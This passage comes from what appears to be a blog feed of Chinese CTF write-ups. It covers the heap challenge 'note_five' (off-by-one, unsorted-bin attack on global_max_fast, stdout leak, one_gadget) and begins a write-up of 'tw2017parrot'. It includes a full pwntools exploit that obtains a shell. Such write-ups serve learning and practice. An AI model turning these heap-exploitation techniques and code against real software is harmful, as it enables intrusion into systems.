exit&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;choice&gt;&gt; &quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> get_num();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">add</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> *v0; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> size; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;idx: &quot;</span>);</span><br><span class=\"line\">  idx = get_num();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( idx &gt;= <span class=\"number\">0</span> &amp;&amp; idx &lt;= <span class=\"number\">4</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;size: &quot;</span>);</span><br><span class=\"line\">    size = get_num();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( size &gt; <span class=\"number\">0x8F</span> &amp;&amp; size &lt;= <span class=\"number\">0x400</span> )         <span class=\"comment\">// size &gt;fast_max_</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      heaplist[idx] = <span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">      v0 = sizeL;</span><br><span class=\"line\">      sizeL[idx] = size;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;size error&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;idx error&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">int</span>)v0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">sub_D47</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;idx: &quot;</span>);</span><br><span class=\"line\">  idx = get_num();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( idx &lt; <span class=\"number\">0</span> || idx &gt; <span class=\"number\">4</span> || !heaplist[idx] )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;idx error&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;content: &quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"type\">read_t</span>(heaplist[idx], sizeL[idx], <span class=\"number\">10LL</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">__int64 __fastcall <span class=\"title function_\">sub_A70</span><span class=\"params\">(__int64 ptr, <span class=\"type\">signed</span> <span class=\"type\">int</span> size, <span class=\"type\">char</span> a3)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 result; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int8 buf; <span class=\"comment\">// [rsp+13h] [rbp-Dh] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+14h] [rbp-Ch]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v7; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v7 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; ; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    result = (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)i;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( i &gt; size )\t\t\t\t\t\t\t<span class=\"comment\">//offbyone</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"type\">int</span>)read(<span class=\"number\">0</span>, &amp;buf, <span class=\"number\">1uLL</span>) &lt;= <span class=\"number\">0</span> )        <span class=\"comment\">// connot input null</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;read error&quot;</span>);</span><br><span class=\"line\">      <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    result = buf;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( buf == a3 )                            <span class=\"comment\">// a3=&#x27;\\n&#x27;</span></span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    *(_BYTE *)(ptr + i) = buf;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">sub_DF5</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> *v0; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> idx; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;idx: &quot;</span>);</span><br><span class=\"line\">  idx = get_num();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( idx &gt;= <span class=\"number\">0</span> &amp;&amp; idx &lt;= <span class=\"number\">4</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( heaplist[idx] )</span><br><span class=\"line\">      <span class=\"built_in\">free</span>((<span class=\"type\">void</span> *)heaplist[idx]);</span><br><span class=\"line\">    heaplist[idx] = <span class=\"number\">0LL</span>;                        <span class=\"comment\">// no uaf</span></span><br><span class=\"line\">    v0 = sizeL;</span><br><span class=\"line\">    sizeL[idx] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;idx error&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">int</span>)v0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>限制了堆块大小，没有输出函数泄露地址，没有 UAF。但 offbyone</p>\n<h2 id=\"思路unsortedbins-attack-攻击global_max_fast将堆块放入fastbins\"><a class=\"markdownIt-Anchor\" href=\"#思路unsortedbins-attack-攻击global_max_fast将堆块放入fastbins\">#</a> 思路：unsortedbins attack 攻击 global_max_fast，将堆块放入 fastbins.</h2>\n<h2 id=\"原理\"><a class=\"markdownIt-Anchor\" href=\"#原理\">#</a> 原理：</h2>\n<h2 id=\"unsorted-bin-概述\"><a class=\"markdownIt-Anchor\" href=\"#unsorted-bin-概述\">#</a> unsorted bin 概述</h2>\n<p>・当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中</p>\n<p>・释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中</p>\n<p>・当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话</p>\n<p>・Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，即<strong>插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong></p>\n<p>・在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中</p>\n<p><img data-src=\"C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220401163135175.png\" alt=\"image-20220401163135175\"></p>\n<p>如果我们控制了 bk 的值，我们就能将 unsorted_chunks (av) 写到 bk+0x10 地址，这是一个很大的值</p>\n<h2 id=\"过程\"><a class=\"markdownIt-Anchor\" href=\"#过程\">#</a> 过程：</h2>\n<p>1，构造 overlap，实现 freechunk 的覆盖</p>\n<p>2：修改 unsorted_chunk 的 bk,</p>\n<p>​\t\t<em>问题，pie 保护导致没有地址，没有输出但上述导致地址无法泄露，如何覆盖到 global_max_fast?</em></p>\n<p>​</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; heap</span><br><span class=\"line\"><span class=\"number\">0x56021208d000</span> PREV_INUSE &#123;</span><br><span class=\"line\">  prev_size = <span class=\"number\">0</span>, </span><br><span class=\"line\">  size = <span class=\"number\">135169</span>, </span><br><span class=\"line\">  fd = <span class=\"number\">0x7fb7435a7b78</span> &lt;main_arena+<span class=\"number\">88</span>&gt;, </span><br><span class=\"line\">  bk = <span class=\"number\">0x7fb7435a7b78</span> &lt;main_arena+<span class=\"number\">88</span>&gt;, </span><br><span class=\"line\">  fd_nextsize = <span class=\"number\">0x0</span>, </span><br><span class=\"line\">  bk_nextsize = <span class=\"number\">0x0</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">pwndbg&gt; p &amp;global_max_fast</span><br><span class=\"line\">$<span class=\"number\">1</span> = (<span class=\"type\">size_t</span> *) <span class=\"number\">0x7fb7435a97f8</span> &lt;global_max_fast&gt;</span><br><span class=\"line\">pwndbg&gt; p &amp;main_arena</span><br><span class=\"line\">$<span class=\"number\">2</span> = (<span class=\"keyword\">struct</span> malloc_state *) <span class=\"number\">0x7fb7435a7b20</span> &lt;main_arena&gt;</span><br><span class=\"line\">pwndbg&gt; </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>最低三字节不会变，末尾第 4 字节不确定，但是偏移量不变，爆破</p>\n<p>・接着利用 fastbin attack 攻击 stdout-0x51 处，我们要攻击 stdout 结构体来泄露 libc 地址</p>\n<p>・stdout-0x51 处有一个错位的 0xff</p>\n<p>・泄露 libc 之后就用和 house of orange 一样的技巧来 getshell，即伪造 stderr 的 vtable，触发 malloc_printerr 来 getshell</p>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cmd</span>(<span class=\"params\">command</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;choice&gt;&gt; &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(command))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">idx,sz</span>):</span><br><span class=\"line\">\tcmd(<span class=\"number\">1</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;idx: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;size: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(sz))</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dele</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tcmd(<span class=\"number\">3</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;idx: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,content</span>):</span><br><span class=\"line\">\tcmd(<span class=\"number\">2</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;idx: &quot;</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">&quot;content: &quot;</span>)</span><br><span class=\"line\">\tp.send(content)</span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>(<span class=\"params\">host,port=<span class=\"number\">9999</span></span>):</span><br><span class=\"line\">\t<span class=\"keyword\">global</span> p</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> host:</span><br><span class=\"line\">\t\tp = remote(host,port)</span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\tp = process(<span class=\"string\">&quot;./note_five&quot;</span>)</span><br><span class=\"line\">\t\tgdb.attach(p)</span><br><span class=\"line\"></span><br><span class=\"line\">\tadd(<span class=\"number\">0</span>,<span class=\"number\">0x98</span>)</span><br><span class=\"line\">\tadd(<span class=\"number\">1</span>,<span class=\"number\">0xa8</span>)</span><br><span class=\"line\">\tadd(<span class=\"number\">2</span>,<span class=\"number\">0x1e8</span>)</span><br><span class=\"line\">\tadd(<span class=\"number\">3</span>,<span class=\"number\">0xe8</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tdele(<span class=\"number\">1</span>)</span><br><span class=\"line\">\tdele(<span class=\"number\">0</span>)</span><br><span class=\"line\">\tdele(<span class=\"number\">2</span>)</span><br><span class=\"line\">\tdele(<span class=\"number\">3</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tadd(<span class=\"number\">0</span>,<span class=\"number\">0xe8</span>)</span><br><span class=\"line\">\tadd(<span class=\"number\">1</span>,<span class=\"number\">0xf8</span>)</span><br><span class=\"line\">\tadd(<span class=\"number\">2</span>,<span class=\"number\">0xf8</span>)</span><br><span class=\"line\">\tadd(<span class=\"number\">3</span>,<span class=\"number\">0x1f8</span>)</span><br><span class=\"line\">\tadd(<span class=\"number\">4</span>,<span class=\"number\">0xe8</span>)</span><br><span class=\"line\">\tdele(<span class=\"number\">0</span>)</span><br><span class=\"line\">\tedit(<span class=\"number\">1</span>,<span class=\"string\">&quot;A&quot;</span>*<span class=\"number\">0xf0</span>+p64(<span class=\"number\">0x1f0</span>)+<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">\tdele(<span class=\"number\">2</span>)</span><br><span class=\"line\">\tadd(<span class=\"number\">0</span>,<span class=\"number\">0xe8</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tt = <span class=\"built_in\">int</span>(raw_input(<span class=\"string\">&#x27;guest: &#x27;</span>))</span><br><span class=\"line\">\t<span class=\"comment\"># t = 8</span></span><br><span class=\"line\">\tglobal_maxfast = (t &lt;&lt; <span class=\"number\">12</span>) | <span class=\"number\">0x7f8</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tstdout = global_maxfast-<span class=\"number\">0x11d8</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tedit(<span class=\"number\">1</span>,<span class=\"string\">&quot;\\x00&quot;</span>*<span class=\"number\">8</span>+p16(global_maxfast-<span class=\"number\">0x10</span>)+<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">\tadd(<span class=\"number\">2</span>,<span class=\"number\">0x1f8</span>)</span><br><span class=\"line\">\tedit(<span class=\"number\">2</span>,<span class=\"string\">&quot;A&quot;</span>*<span class=\"number\">0x1f8</span>+<span class=\"string\">&#x27;\\xf1&#x27;</span>)</span><br><span class=\"line\">\tedit(<span class=\"number\">0</span>,<span class=\"string\">&quot;\\x00&quot;</span>*<span class=\"number\">0x98</span>+p64(<span class=\"number\">0xf1</span>)+p16(stdout-<span class=\"number\">0x51</span>)+<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">\tdele(<span class=\"number\">0</span>)</span><br><span class=\"line\">\tdele(<span class=\"number\">4</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tdele(<span class=\"number\">3</span>)</span><br><span class=\"line\">\tadd(<span class=\"number\">3</span>,<span class=\"number\">0x2e8</span>)</span><br><span class=\"line\">\tedit(<span class=\"number\">3</span>,<span class=\"string\">&quot;A&quot;</span>*<span class=\"number\">0x1f8</span>+p64(<span class=\"number\">0xf1</span>)+<span class=\"string\">&#x27;\\xa0\\n&#x27;</span>)</span><br><span class=\"line\">\tdele(<span class=\"number\">2</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tadd(<span class=\"number\">0</span>,<span class=\"number\">0xe8</span>)</span><br><span class=\"line\">\tadd(<span class=\"number\">2</span>,<span class=\"number\">0xe8</span>)</span><br><span class=\"line\">\tadd(<span class=\"number\">4</span>,<span class=\"number\">0xe8</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tedit(<span class=\"number\">4</span>,<span class=\"string\">&#x27;A&#x27;</span>+<span class=\"string\">&quot;\\x00&quot;</span>*<span class=\"number\">0x40</span>+p64(<span class=\"number\">0xfbad1800</span>)+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+<span class=\"string\">&#x27;\\x00\\n&#x27;</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tp.recv(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tlibc.address = u64(p.recv(<span class=\"number\">8</span>))-<span class=\"number\">0x3c5600</span></span><br><span class=\"line\">\tinfo(<span class=\"string\">&quot;libc : &quot;</span> + <span class=\"built_in\">hex</span>(libc.address))</span><br><span class=\"line\">\tpause()</span><br><span class=\"line\">\tone_gadget = <span class=\"number\">0xf1207</span>+libc.address</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tpayload = <span class=\"string\">&#x27;\\x00&#x27;</span>+p64(libc.address+<span class=\"number\">0x3c55e0</span>)+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(<span class=\"number\">0x1</span>)+p64(one_gadget)*<span class=\"number\">2</span>+p64(libc.address+<span class=\"number\">0x3c5600</span>-<span class=\"number\">8</span>)</span><br><span class=\"line\">\tedit(<span class=\"number\">4</span>,payload+<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tadd(<span class=\"number\">1</span>,<span class=\"number\">1000</span>)</span><br><span class=\"line\">\tp.interactive()</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">\tlibc = ELF(<span class=\"string\">&quot;./libc-2.23.so&quot;</span>,checksec=<span class=\"literal\">False</span>)</span><br><span class=\"line\">\t<span class=\"comment\"># elf = ELF(&quot;./mheap&quot;,checksec=False)</span></span><br><span class=\"line\">\tmain(args[<span class=\"string\">&#x27;REMOTE&#x27;</span>])</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "writeup"
            ]
        },
        {
            "id": "http://example.com/2022/03/22/tw2017parrot/",
            "url": "http://example.com/2022/03/22/tw2017parrot/",
            "title": "tw2017parrot",
            "date_published": "2022-03-22T12:11:00.000Z",
            "content_html": "<h1 id=\"\"><a class=\"markdownIt-Anchor\" href=\"#\">#</a> </h1>\n<h1 id=\"i-io_buf_base劫持技术\"><a class=\"markdownIt-Anchor\" href=\"#i-io_buf_base劫持技术\">#</a> I IO_buf_base 劫持技术，</h1>\n<h2 id=\"文章写的会比较凌乱是在一边解题同时记录\"><a class=\"markdownIt-Anchor\" href=\"#文章写的会比较凌乱是在一边解题同时记录\">#</a> 文章写的会比较凌乱，是在一边解题同时记录</h2>\n<h2 id=\"环境以及保护\"><a class=\"markdownIt-Anchor\" href=\"#环境以及保护\">#</a> 环境以及保护</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">giantbranch@ubuntu:~/Desktop/pwnabletw/hijack_io_buf_base$ strings libc.so<span class=\"number\">.6</span> | grep ubuntu </span><br><span class=\"line\">GNU C <span class=\"title function_\">Library</span> <span class=\"params\">(Ubuntu GLIBC <span class=\"number\">2.23</span><span class=\"number\">-0u</span>buntu11)</span> stable release version 2.23, by Roland McGrath et al.</span><br><span class=\"line\">&lt;https:<span class=\"comment\">//bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span></span><br><span class=\"line\">giantbranch@ubuntu:~/Desktop/pwnabletw/hijack_io_buf_base$ checksec --file=tw2017parrot</span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/giantbranch/Desktop/pwnabletw/hijack_io_buf_base/tw2017parrot&#x27;</span></span><br><span class=\"line\">    Arch:     amd64<span class=\"number\">-64</span>-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br><span class=\"line\">giantbranch@ubuntu:~/Desktop/pwnabletw/hijack_io_buf_base$ file tw2017parrot </span><br><span class=\"line\">tw2017parrot: ELF <span class=\"number\">64</span>-bit LSB shared object, x86<span class=\"number\">-64</span>, version <span class=\"number\">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class=\"number\">-64.</span>so<span class=\"number\">.2</span>, <span class=\"keyword\">for</span> GNU/Linux <span class=\"number\">2.6</span><span class=\"number\">.32</span>, BuildID[sha1]=<span class=\"number\">00f</span>bccd873daf9400480cbb4dbd48845f1bb97b8, not stripped</span><br><span class=\"line\">giantbranch@ubuntu:~/Desktop/pwnabletw/hijack_io_buf_base$ </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>ubuntu2.23 下的题目，只有 canary 保护没有开启，没有思路</p>\n<h2 id=\"主要代码\"><a class=\"markdownIt-Anchor\" href=\"#主要代码\">#</a> 主要代码</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl __noreturn <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">size_t</span> size; <span class=\"comment\">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">void</span> *buf; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  sleep(<span class=\"number\">3u</span>);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Size:&quot;</span>);</span><br><span class=\"line\">    _isoc99_scanf(<span class=\"string\">&quot;%lu&quot;</span>, &amp;size);</span><br><span class=\"line\">    getchar();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !size )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    buf = <span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Buffer:&quot;</span>);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>, buf, size);</span><br><span class=\"line\">    *((_BYTE *)buf + size - <span class=\"number\">1</span>) = <span class=\"number\">0</span>;\t\t\t<span class=\"comment\">//这个很关键</span></span><br><span class=\"line\">    write(<span class=\"number\">1</span>, buf, size);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(buf);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span 